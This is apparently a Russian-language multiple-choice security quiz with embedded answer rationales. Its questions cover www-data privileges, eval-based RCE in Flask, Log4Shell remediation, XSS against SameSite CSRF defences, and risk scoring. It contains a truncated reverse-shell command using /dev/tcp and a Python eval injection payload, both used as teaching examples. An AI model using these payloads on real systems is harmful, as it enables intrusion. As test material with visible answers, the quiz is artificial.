**2.** Процесс запущен от пользователя `www-data`. Злоумышленник эксплуатировал RCE в веб-приложении и получил shell с правами `www-data`. Файл `/etc/shadow` имеет права `640`, владелец `root:shadow`. Что из перечисленного **невозможно** сделать атакующему напрямую от `www-data`?

- A) Прочитать файлы в `/var/www/html`, доступные `www-data`
- B) Установить `setuid`-бинарь в `/tmp` и запустить его
- C) Прочитать `/etc/shadow` для офлайн-взлома хешей паролей — `www-data` не входит в группу `shadow`
- D) Запустить reverse shell к атакующему через `bash -i >& /dev/tcp/...`

**3.** Semgrep находит в Flask-приложении следующий код:

```python
result = eval(request.args.get("formula"))
```

Разработчик утверждает: «`eval` безопасен, если передавать только математические выражения». Что является корректным контраргументом?

- A) `eval` безопасен при использовании HTTPS — данные зашифрованы при передаче
- B) Проблема только в отсутствии валидации входных данных — достаточно проверить тип
- C) `eval` выполняет произвольный Python-код: `__import__('os').system('id')` — легитимное с виду «выражение» даёт RCE; ввод контролируется атакующим, не сервером
- D) `eval` небезопасен только при использовании в Python 2, в Python 3 он безопасен

**6.** OWASP Dependency-Check сканирует Java-проект и находит `CVE-2021-44228` (Log4Shell, CVSS 10.0) в транзитивной зависимости `log4j-core:2.14.1`. Прямая зависимость проекта — `spring-boot-starter-web:2.6.1`, которая тянет Log4j. Какой подход устранения наиболее корректен?

- A) Удалить `spring-boot-starter-web` — это единственный способ убрать транзитивную зависимость
- B) Добавить explicit dependency `log4j-core:2.17.1` в `pom.xml` с `<exclusion>` старой версии из Spring — Maven разрешит конфликт в пользу явной версии
- C) Добавить `CVE-2021-44228` в suppression file — это false positive для Spring Boot
- D) Обновить JDK до последней версии — Log4Shell не работает на новых JVM

**7.** Приложение защищено от CSRF через `SameSite=Strict` cookie. Пентестер обнаружил Stored XSS в профиле пользователя. Он утверждает, что через XSS можно обойти CSRF-защиту. Прав ли он и почему?

- A) Нет — `SameSite=Strict` защищает от любых cross-origin запросов, включая XSS
- B) Да — XSS выполняется в контексте того же origin (same-site), поэтому `SameSite` cookie отправляются; атакующий скрипт может выполнять любые запросы от имени жертвы
- C) Нет — XSS и CSRF — независимые уязвимости, одна не влияет на другую
- D) Да, но только если XSS — Reflected; Stored XSS не может отправлять запросы

**9.** При оценке риска используется формула `Риск = Вероятность × Ущерб`. Уязвимость имеет высокий ущерб (9/10), но низкую вероятность эксплуатации (1/10). Итоговый риск — 9. Соседняя уязвимость: ущерб 4/10, вероятность 8/10, риск — 32. Как приоритизировать устранение и почему простая сортировка по ущербу ошибочна?

- A) Приоритет — первая (ущерб 9), так как потенциальные последствия критичнее
- B) Обе уязвимости равнозначны — нужно устранять в порядке поступления
- C) Приоритет — вторая (риск 32): реальная угроза определяется произведением вероятности и ущерба; высокоэксплуатируемые уязвимости со средним ущербом чаще приводят к инцидентам, чем теоретически опасные, но труднодостижимые
- D) Метрики вероятности ненадёжны — нужно ориентироваться только на ущерб
